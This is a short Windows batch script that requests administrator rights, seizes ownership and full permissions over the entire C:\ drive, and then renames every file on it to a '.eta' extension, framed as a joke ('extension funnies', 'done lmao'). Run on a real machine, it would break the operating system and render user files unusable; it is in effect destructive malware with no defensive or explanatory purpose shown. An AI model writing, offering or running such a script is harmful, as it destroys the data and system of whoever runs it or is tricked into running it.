@echo off
setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo getting admin
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set "newExt=.eta"
set "root=C:\"

echo getting perms for "%root%"
takeown /f "%root%" /r /d y >nul
icacls "%root%" /grant administrators:F /t /c >nul

echo.
echo doing extension funnies
for /r "%root%" %%f in (*.*) do (
    set "name=%%~nf"
    ren "%%f" "!name!%newExt%" 2>nul
)

echo.
echo done lmao
pause
